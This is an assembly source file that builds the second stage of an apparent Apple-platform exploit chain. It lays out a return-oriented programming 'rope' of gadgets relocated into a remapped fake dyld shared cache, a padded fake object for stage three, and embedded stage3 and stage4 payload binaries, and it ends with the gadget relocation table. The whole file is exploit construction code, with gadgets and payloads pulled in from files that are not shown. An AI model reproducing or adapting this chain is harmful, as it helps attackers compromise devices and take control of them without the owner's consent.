%include "config2.asm"

        org   STAGE2_STATIC_ADDRESS

%define dd    dq
%define du    dq                            ; we are org-ed at the right address
%define dg    dq FAKE_SHARED_CACHE_ADDR - DYLD_SHARED_CACHE_ADDR + ; cache is remapped here

rope:
        dq    0                             ; initial X29

%include "rel2.asm"

%undef  dg

%define LG(x) ___gadget %+ x

%macro dg 1
LG(G):  dd %1
%assign G G+1
%endmacro

%assign G 0

%include "rope2.asm"

        align 8
stage4_begin:
incbin "stage4.bin"
stage4_end:
        align 8
fake:
        times STAGE3_FAKE_OBJECT_SZ db 'q'
stage3_begin:
incbin "stage3.bin"
stage3_end:

        align 8
        dq    0                             ; begin pointer relocs

%assign R 0
%rep G
        dq    LG(R) - rope
%assign R R+1
%endrep

rope_end:
